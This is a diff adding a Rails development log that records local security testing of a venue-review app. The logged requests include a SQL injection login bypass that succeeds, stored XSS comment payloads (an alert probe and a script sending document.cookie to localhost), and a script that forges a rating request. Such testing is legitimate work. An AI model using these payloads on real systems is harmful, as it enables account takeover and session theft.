+Rendering /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/layout.erb (internal_server_error)
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-26 16:50:00) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"dbf1721020854b33862ecb00e19544ccc0501787", "user"=>{"username"=>"wally", "password"=>"fakepass' OR 'a'='a"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Load (0.3ms)[0m   [0;1mSELECT * FROM `users` WHERE (username = 'wally' AND password = 'fakepass' OR 'a'='a') LIMIT 1[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+Redirected to /users/1
+Completed in 8ms (DB: 2) | 302 Found [http://localhost/session/check_login]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:50:00) [GET]
+  Parameters: {"id"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.6ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.3ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 1) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.6ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 1) [0m
+Completed in 23ms (View: 16, DB: 2) | 200 OK [http://localhost/users/1]
+
+
+Processing SessionController#logout (for 127.0.0.1 at 2010-11-26 18:01:38) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/logout
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/logout]
+
+
+Processing WelcomeController#index (for 127.0.0.1 at 2010-11-27 10:05:43) [GET]
+  [4;36;1mSQL (0.5ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mComment Load (1.7ms)[0m   [0;1mSELECT * FROM `comments` ORDER BY created_at desc LIMIT 5[0m
+  [4;35;1mTag Load (1.3ms)[0m   [0mSELECT * FROM `tags` LIMIT 25[0m
+Rendering template within layouts/application
+Rendering welcome/index
+  [4;36;1mComment Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+Rendered comments/_comment (9.8ms)
+Rendered comments/_comment (0.5ms)
+  [4;35;1mTag Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+Completed in 33ms (View: 21, DB: 4) | 200 OK [http://localhost/]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-27 10:05:48) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 7ms (View: 4, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-27 10:06:14) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"username"=>"<i>wally</i>", "password"=>"blah"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Load (26.9ms)[0m   [0;1mSELECT * FROM `users` WHERE (username = '<i>wally</i>' AND password = 'blah') LIMIT 1[0m
+Redirected to /login
+Completed in 32ms (DB: 27) | 302 Found [http://localhost/session/check_login]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-27 10:06:14) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 4, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-27 10:07:21) [GET]
+  Parameters: {"user"=>{"username"=>"<i>wally</i>"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Load (0.3ms)[0m   [0mSELECT * FROM `users` WHERE (username = '<i>wally</i>' AND password = '') LIMIT 1[0m
+Redirected to /login
+Completed in 5ms (DB: 0) | 302 Found [http://localhost/session/check_login?user%5Busername%5D=%3Ci%3Ewally%3C/i%3E]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-27 10:07:21) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 65ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-27 10:21:34) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"username"=>"charlie", "password"=>"password"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Load (0.4ms)[0m   [0;1mSELECT * FROM `users` WHERE (username = 'charlie' AND password = 'password') LIMIT 1[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+Redirected to /users/6
+Completed in 8ms (DB: 2) | 302 Found [http://localhost/session/check_login]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-27 10:21:34) [GET]
+  Parameters: {"id"=>"6"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.0ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (1.1ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 6 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (7.2ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (1.4ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 6) [0m
+Completed in 49ms (View: 41, DB: 2) | 200 OK [http://localhost/users/6]
+
+
+Processing VenuesController#show (for 127.0.0.1 at 2010-11-27 10:21:47) [GET]
+  Parameters: {"id"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.9ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (2.3ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.4ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering venues/show
+DEPRECATION WARNING: Calling render with a string will render a partial from Rails 2.3. Change this call to render(:file => 'tags/cloud', :locals => locals_hash).. (called from render at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:243)
+  [4;35;1mJoin Table Columns (2.2ms)[0m   [0mSHOW FIELDS FROM `tags_venues`[0m
+  [4;36;1mTag Load (0.4ms)[0m   [0;1mSELECT * FROM `tags` INNER JOIN `tags_venues` ON `tags`.id = `tags_venues`.tag_id WHERE (`tags_venues`.venue_id = 1 ) [0m
+  [4;35;1mTag Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+Rendered tags/_show (3.0ms)
+Rendered tags/_new (1.0ms)
+  [4;36;1mRating Load (1.3ms)[0m   [0;1mSELECT * FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+  [4;35;1mRating Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.2ms)
+  [4;36;1mComment Load (0.2ms)[0m   [0;1mSELECT * FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'Venue') [0m
+  [4;35;1mComment Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mRole Columns (2.1ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.5ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+Rendered comments/_comment (8.1ms)
+Rendered comments/_comment (0.5ms)
+Rendered comments/_new (1.4ms)
+Completed in 136ms (View: 121, DB: 5) | 200 OK [http://localhost/venues/show/1]
+
+
+Processing CommentsController#create (for 127.0.0.1 at 2010-11-27 10:22:02) [POST]
+  Parameters: {"comment"=>{"body"=>"<script>\nalert(\"I'm vulnerable. Please hold me.\" );\n</script>", "subject"=>"blah"}, "commit"=>"Create", "venue_id"=>"1", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.6ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.6ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;36;1mComment Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mComment Create (0.3ms)[0m   [0;1mINSERT INTO `comments` (`created_at`, `body`, `commentable_type`, `commentable_id`, `updated_at`, `subject`, `user_id`) VALUES('2010-11-27 15:22:02', '<script>\nalert(\"I\'m vulnerable. Please hold me.\" );\n</script>', 'Venue', 1, '2010-11-27 15:22:02', 'blah', 6)[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mCOMMIT[0m
+  [4;36;1mRole Columns (0.9ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.6ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+  [4;36;1mUser Load (0.2ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (8.0ms)
+Completed in 29ms (View: 8, DB: 7) | 200 OK [http://localhost/venues/1/comments]
+
+
+Processing VenuesController#show (for 127.0.0.1 at 2010-11-27 10:22:34) [GET]
+  Parameters: {"id"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.6ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.6ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering venues/show
+DEPRECATION WARNING: Calling render with a string will render a partial from Rails 2.3. Change this call to render(:file => 'tags/cloud', :locals => locals_hash).. (called from render at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:243)
+  [4;35;1mJoin Table Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `tags_venues`[0m
+  [4;36;1mTag Load (0.5ms)[0m   [0;1mSELECT * FROM `tags` INNER JOIN `tags_venues` ON `tags`.id = `tags_venues`.tag_id WHERE (`tags_venues`.venue_id = 1 ) [0m
+  [4;35;1mTag Columns (0.8ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+Rendered tags/_show (2.3ms)
+Rendered tags/_new (0.7ms)
+  [4;36;1mRating Load (0.3ms)[0m   [0;1mSELECT * FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+  [4;35;1mRating Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.1ms)
+  [4;36;1mComment Load (0.2ms)[0m   [0;1mSELECT * FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'Venue') [0m
+  [4;35;1mComment Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mRole Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.6ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+Rendered comments/_comment (6.4ms)
+Rendered comments/_comment (0.5ms)
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (2.0ms)
+Rendered comments/_new (1.0ms)
+Completed in 114ms (View: 100, DB: 5) | 200 OK [http://localhost/venues/show/1]
+
+
+Processing CommentsController#create (for 127.0.0.1 at 2010-11-27 12:05:56) [POST]
+  Parameters: {"comment"=>{"body"=>"<script>\nnew Image().src = \"http://localhost:3000/?cookie=\" + escape(document.cookie);\n</script>", "subject"=>""}, "commit"=>"Create", "venue_id"=>"1", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.5ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.6ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;35;1mComment Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mROLLBACK[0m
+  [4;36;1mRole Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.6ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (6.6ms)
+Completed in 29ms (View: 7, DB: 7) | 200 OK [http://localhost/venues/1/comments]
+
+
+Processing WelcomeController#index (for 127.0.0.1 at 2010-11-27 12:05:56) [GET]
+  Parameters: {"cookie"=>""}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mComment Load (0.3ms)[0m   [0mSELECT * FROM `comments` ORDER BY created_at desc LIMIT 5[0m
+  [4;36;1mTag Load (0.1ms)[0m   [0;1mSELECT * FROM `tags` LIMIT 25[0m
+Rendering template within layouts/application
+Rendering welcome/index
+  [4;35;1mComment Columns (1.6ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mUser Columns (1.5ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.4ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (77.9ms)
+Rendered comments/_comment (0.7ms)
+Rendered comments/_comment (0.4ms)
+  [4;36;1mTag Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `tags`[0m
+Completed in 94ms (View: 88, DB: 1) | 200 OK [http://localhost/?cookie=]
+
+
+Processing CommentsController#create (for 127.0.0.1 at 2010-11-27 12:07:28) [POST]
+  Parameters: {"comment"=>{"body"=>"<script>\nnew Image().src = \"http://localhost:3000/?cookie=\" + escape(document.cookie);\n</script>", "subject"=>""}, "commit"=>"Create", "venue_id"=>"1", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.5ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (1.3ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;35;1mComment Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mROLLBACK[0m
+  [4;36;1mRole Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.4ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (5.8ms)
+Completed in 30ms (View: 6, DB: 8) | 200 OK [http://localhost/venues/1/comments]
+
+
+Processing WelcomeController#index (for 127.0.0.1 at 2010-11-27 12:07:28) [GET]
+  Parameters: {"cookie"=>""}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mComment Load (0.3ms)[0m   [0mSELECT * FROM `comments` ORDER BY created_at desc LIMIT 5[0m
+  [4;36;1mTag Load (0.2ms)[0m   [0;1mSELECT * FROM `tags` LIMIT 25[0m
+Rendering template within layouts/application
+Rendering welcome/index
+  [4;35;1mComment Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.4ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (11.6ms)
+Rendered comments/_comment (0.5ms)
+Rendered comments/_comment (0.4ms)
+  [4;36;1mTag Columns (0.9ms)[0m   [0;1mSHOW FIELDS FROM `tags`[0m
+Completed in 26ms (View: 20, DB: 1) | 200 OK [http://localhost/?cookie=]
+
+
+Processing VenuesController#index (for 127.0.0.1 at 2010-11-27 12:16:10) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.4ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.4ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Load (0.3ms)[0m   [0mSELECT * FROM `venues` [0m
+Rendering template within layouts/application
+Rendering venues/index
+  [4;36;1mVenue Columns (1.6ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+Rendered venues/_venue (5.0ms)
+Rendered venues/_venue (0.3ms)
+Rendered venues/_venue (0.2ms)
+Completed in 42ms (View: 28, DB: 3) | 200 OK [http://localhost/venues]
+
+
+Processing VenuesController#show (for 127.0.0.1 at 2010-11-27 12:16:32) [GET]
+  Parameters: {"id"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.4ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.5ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering venues/show
+DEPRECATION WARNING: Calling render with a string will render a partial from Rails 2.3. Change this call to render(:file => 'tags/cloud', :locals => locals_hash).. (called from render at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:243)
+  [4;35;1mJoin Table Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `tags_venues`[0m
+  [4;36;1mTag Load (0.5ms)[0m   [0;1mSELECT * FROM `tags` INNER JOIN `tags_venues` ON `tags`.id = `tags_venues`.tag_id WHERE (`tags_venues`.venue_id = 1 ) [0m
+  [4;35;1mTag Columns (0.8ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+Rendered tags/_show (2.3ms)
+Rendered tags/_new (0.7ms)
+  [4;36;1mRating Load (0.2ms)[0m   [0;1mSELECT * FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+  [4;35;1mRating Columns (0.9ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.0ms)
+  [4;36;1mComment Load (0.2ms)[0m   [0;1mSELECT * FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'Venue') [0m
+  [4;35;1mComment Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mRole Columns (0.9ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.4ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+Rendered comments/_comment (5.8ms)
+Rendered comments/_comment (0.4ms)
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (1.7ms)
+Rendered comments/_new (1.0ms)
+Completed in 50ms (View: 39, DB: 3) | 200 OK [http://localhost/venues/1]
+
+
+Processing CommentsController#create (for 127.0.0.1 at 2010-11-27 12:16:59) [POST]
+  Parameters: {"comment"=>{"body"=>"<script>\nnew Image().src = \"http://localhost:3000/ratings/rate/2?score=1\"\n</script>", "subject"=>""}, "commit"=>"Create", "venue_id"=>"1", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.4ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.4ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;35;1mComment Columns (0.9ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mROLLBACK[0m
+  [4;36;1mRole Columns (0.9ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.4ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (5.8ms)
+Completed in 90ms (View: 6, DB: 6) | 200 OK [http://localhost/venues/1/comments]
+
+
+Processing RatingsController#rate (for 127.0.0.1 at 2010-11-27 12:16:59) [GET]
+  Parameters: {"id"=>"2", "score"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.4ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.6ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.5ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 2) [0m
+  [4;35;1mRating Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mRating Create (0.2ms)[0m   [0mINSERT INTO `ratings` (`created_at`, `updated_at`, `venue_id`, `user_id`, `ratings_count`, `score`) VALUES('2010-11-27 17:16:59', '2010-11-27 17:16:59', 2, 6, NULL, 1)[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mCOMMIT[0m
+  [4;35;1mSQL (0.3ms)[0m   [0mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 2) [0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 2) [0m
+Rendered ratings/_show (1.4ms)
+Completed in 22ms (View: 2, DB: 6) | 200 OK [http://localhost/ratings/rate/2?score=1]
+
+
+Processing VenuesController#index (for 127.0.0.1 at 2010-11-27 12:17:31) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.9ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Load (0.2ms)[0m   [0mSELECT * FROM `venues` [0m
+Rendering template within layouts/application
+Rendering venues/index
+  [4;36;1mVenue Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+Rendered venues/_venue (3.5ms)
+Rendered venues/_venue (0.2ms)
+Rendered venues/_venue (0.2ms)
+Completed in 20ms (View: 9, DB: 3) | 200 OK [http://localhost/venues]
+
+
